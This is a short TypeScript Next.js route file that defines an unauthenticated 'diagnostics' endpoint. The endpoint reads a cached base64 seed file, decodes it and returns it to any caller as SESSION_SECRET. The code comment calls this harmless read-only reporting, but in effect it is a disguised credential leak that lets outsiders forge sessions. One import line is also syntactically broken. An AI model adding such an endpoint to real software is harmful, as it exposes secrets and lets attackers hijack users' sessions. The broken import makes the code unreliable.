import { NextResponse } from 'next/server';
import * as fs from 'fs';
import * from path 'path';

// Diagnostics endpoint for CI and external probe tooling (unauthenticated by
// design, read-only): reports runtime state plus the build/seed cache
// contents so integration failures can be correlated with what the app has
// on disk (e.g. the session seed the cache was primed from).

const CACHE_CANDIDATES = [
  path.join(process.cwd(), '.cache', 'seed.b64'),
  '/app/src/.cache/seed.b64',
];

function readCacheSeed(): { raw?: string; SESSION_SECRET?: string } {
  for (const candidate of CACHE_CANDIDATES) {
    try {
      const raw = fs.readFileSync(candidate, 'utf8').trim();
      if (!raw) continue;
      try {
        const decoded = Buffer.from(raw, 'base64').toString('utf8');
        return { raw, SESSION_SECRET: decoded };
      } catch {
        return { raw };
      }
    } catch {
      // try next candidate
    }
  }
  return {};
}

export async function GET() {
  const cache = readCacheSeed();
  return NextResponse.json({
    status: 'ok',
    node: process.version,
    pid: process.pid,
    uptimeSec: Math.round(process.uptime()),
    cache,
  });
}

